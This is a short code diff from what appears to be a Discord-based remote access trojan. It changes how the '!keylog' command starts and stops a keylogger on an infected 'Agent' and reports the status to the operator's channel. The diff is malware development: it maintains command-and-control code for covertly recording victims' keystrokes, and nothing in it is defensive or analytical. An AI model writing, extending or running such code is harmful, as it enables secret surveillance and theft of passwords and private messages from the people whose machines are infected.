@@ -266,10 +266,7 @@ async def keylog(context):
     command = context.message.content.replace("!keylog ", "")
     word_list = command.split()
     if int(word_list[0]) == int(ID):
-        global keylog_status
-        keylog_status = True
         def keylogger_start():
-            global keylog_status
             try:
                 try:
                     interval = int(word_list[1])
@@ -279,7 +276,6 @@ async def keylog(context):
                 try:
                     if word_list[1] == "stop":
                         keyloggerr.stop()
-                        keylog_status = False
                         return
                 except:
                     pass
@@ -288,7 +284,7 @@ async def keylog(context):
                 my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
         try:
             try:
-                if not keylog_status:
+                if word_list[1] == "stop":
                     my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0xFF0000)
                     await context.message.channel.send(embed=my_embed)
                     return
